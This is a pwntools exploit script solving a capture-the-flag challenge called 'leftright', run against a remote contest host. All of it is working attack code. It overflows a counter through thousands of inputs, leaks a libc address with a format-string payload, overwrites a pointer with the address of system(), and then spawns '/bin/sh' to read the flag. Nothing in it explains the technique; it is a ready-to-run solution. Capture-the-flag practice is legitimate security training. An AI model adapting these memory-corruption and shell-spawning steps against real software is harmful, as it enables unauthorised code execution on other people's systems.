from pwn import *
from icecream import ic

elf = exe = ELF("./leftright_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.actf.co", 31324)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+58
b *main+212
b *main+434
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

sla(b': ', b'a'*0xe)

c = -1

for _ in range(0x8000):
    sl(b'1')
    c += 1

for _ in range(0x8000):
    rl()

for _ in range(0xff88-0x8000):
    sl(b'1')
    c += 1

for _ in range(0xff88-0x8000):
    rl()



sl(b'2')
sl(b'\x76')


for _ in range(0x38):
    sl(b'1')
    c += 1

for _ in range(0x38):
    rl()

sl(b'2')
sl(b'\xb9')
sl(b'1')
c += 1

rl()

sl(b'2')
sl(b'\x51')

for _ in range(0xffff-c):
    sl(b'1')

for _ in range(0xffff-c):
    rl()

sl(b'0')
sl(b'%21$p')
sl(b'3')
# context.log_level = "debug"

ru("bye")
libc.address = int(rl().strip().decode(), 16) - 0x29d90
ic(hex(libc.address))
c = -1

for _ in range(0x4000):
    sl(b'1')
    c += 1

for _ in range(0x4000):
    rl()

for _ in range(0x4000):
    sl(b'1')
    c += 1

for _ in range(0x4000):
    rl()

for _ in range(0xff88-0xc000):
    sl(b'1')
    c += 1

for _ in range(0xff88-0xc000):
    rl()

for _ in range(0x4000):
    sl(b'1')
    c += 1
    
for _ in range(0x4000):
    rl()

a = hex(libc.symbols['system'])
n = 2
l = [a[i:i+n] for i in range(0, len(a), n)]
ic(l)

for _ in range(6):
    sl(b'2')
    sl(p8(int(l.pop(), 16)))
    sl(b'1')
    c += 1

for _ in range(6):
    rl()

for _ in range(0xffff-c):
    sl(b'1')

for _ in range(0xffff-c):
    rl()


sl(b'0')
sl(b'/bin/sh\x00')
sl(b'3')
# sl(b'cat flag*')
# sl(b'cat flag*')
ru("sh: 1: bye: not found")
sl(b'cat flag*')


io.interactive()
